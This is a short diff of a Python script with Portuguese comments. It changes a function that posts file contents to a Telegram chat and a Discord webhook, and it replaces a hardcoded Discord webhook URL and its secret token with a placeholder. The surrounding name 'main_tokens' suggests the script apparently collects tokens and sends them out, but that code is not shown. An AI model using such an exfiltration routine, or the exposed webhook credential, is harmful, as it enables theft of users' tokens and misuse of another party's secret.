@@ -255,7 +255,7 @@ def main_tokens():
 def post_to(file_content):
     token = "TELEGRAM TOKEN"  # Coloque seu token aqui
     chat_id = "TELEGRAM CHATID"  # Coloque o ID do chat aqui
-    webhook_url = "https://discord.com/api/webhooks/1297124477619929128/Cpwsm_eMejpRocoQl733lmKoqtNQBdSNnAtL5XjsxXg6At-EbveXbPXsrXEwTP23YzLO"  # URL do webhook do Discord
+    webhook_url = "URL WEBHOOK"  # URL do webhook do Discord
 
     # Enviar para Telegram
     if token != "TELEGRAM TOKEN" and chat_id != "TELEGRAM CHATID":
